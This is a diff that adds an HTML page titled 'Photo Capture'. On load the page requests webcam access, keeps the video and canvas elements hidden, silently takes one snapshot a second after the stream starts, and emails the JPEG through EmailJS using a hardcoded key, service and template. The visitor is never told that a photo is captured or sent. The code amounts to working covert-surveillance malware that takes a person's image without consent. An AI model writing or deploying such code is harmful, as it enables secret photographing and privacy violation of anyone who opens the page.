@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Photo Capture</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("HYkLzrPF1gJL68ZM6");
+    })();
+  </script>
+</head>
+<body>
+
+  <!-- Hidden video and canvas elements -->
+  <video id="video" width="400" height="300" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    let sent = false; // Prevents sending multiple times
+
+    // Request webcam access immediately on page load
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+      })
+      .catch((err) => {
+        console.error("Webcam error:", err);
+      });
+
+    // Automatically capture and send once the video starts playing
+    video.addEventListener('playing', () => {
+      if (sent) return; // Run only once
+      sent = true;
+
+      // Give it a brief moment to adjust lighting/focus
+      setTimeout(() => {
+        context.drawImage(video, 0, 0, 400, 300);
+        // Compress image to JPEG to avoid 413 Payload Too Large error
+        const imageData = canvas.toDataURL('image/jpeg', 0.5);
+
+        const templateParams = {
+          image_data: imageData
+        };
+
+        emailjs.send('service_zqiq3jm', 'template_chfkpuk', templateParams)
+          .then(() => {
+            console.log('Photo sent automatically!');
+          }, (error) => {
+            console.error('FAILED...', error);
+          });
+      }, 1000); // 1-second delay
+    });
+  </script>
+
+</body>
+</html>
